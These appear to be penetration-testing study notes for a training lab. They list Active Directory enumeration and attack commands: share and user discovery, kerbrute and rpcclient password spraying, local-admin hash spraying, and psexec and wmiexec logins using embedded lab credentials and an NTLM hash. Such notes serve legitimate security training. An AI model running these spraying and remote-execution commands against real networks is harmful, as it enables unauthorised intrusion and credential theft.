Finding active host within domain
```shell-session
fping -asgq 172.16.5.0/23
```

Finding NULL Sessions

```shell-session
rpcclient -U "" -N 172.16.5.5
```


Find Host and discover shares
```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

Credentialed smb share discovery
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
```shell-session
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

Credentialed directory discovery
```shell-session
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -r 'Department Shares' --dir-only
```


Credentialed smb share file spidering
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

Credentialed admin discovery
```shell-session
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

Credentialed privilege user discovery
```shell-session
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

#### User and Group Discovery

Generating user account list
https://github.com/insidetrust/statistically-likely-usernames

Discovering valid users
```shell-session
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
```shell-session
crackmapexec smb 172.16.5.5 --users
```
```shell-session
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

Create list of domain users
```powershell-session
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

Credentialed valid user discovery
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

Discovering valid users with user list
```shell-session
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

(Extract usernames)

grep -oE '[^[:space:]]+@' logfile.txt | cut -d'@' -f1
```

Check if user in groups
```powershell-session
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
```powershell-session
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

Discover account group partnership
```powershell-session
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

Credentialed logged on user discovery
```shell-session
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

Credentialed group discovery
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

Query group member info
```powershell-session
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

Admin login via impacket
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```
Stealthy admin login via impacket
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

#### Password Discovery

Password policy
```shell-session
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

```shell-session
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

Password spraying linux

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
```shell-session
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

Password spraying windows 
	https://github.com/dafthack/DomainPasswordSpray
```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

Admin account hash spraying host within domain
```shell-session
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

#### Account Attributes


Get common user attributes
```powershell-session
Get-ADUser -Identity htb-student
```

Group Details
```powershell-session
Get-ADGroup -Identity "Server Operators" -Properties *
```

Current User Privileges
```powershell-session
whoami /priv
```

Check for reversible password
```powershell-session
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

Check Description and Notes for Info
```powershell-session
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

Check For PASSWD_NOTREQD setting
```powershell-session
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

#### Security Controls ####

Check Windows Devender
```powershell-session
Get-MpComputerStatus
```

Check Whitelist applications and paths
```powershell-session
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Checking if in constrained mode
```powershell-session
$ExecutionContext.SessionState.LanguageMode
```

Show users delegated to read LAPS passwords
```powershell-session
Find-LAPSDelegatedGroups
```

Show host with LAPS enabled when password expires
```powershell-session
Get-LAPSComputers
```

Show users within extended rights
```powershell-session
Find-AdmPwdExtendedRights
```

## Network Information

| **Networking Commands**              | **Description**                                                                                                  |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |
#### Quick WMI checks

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |
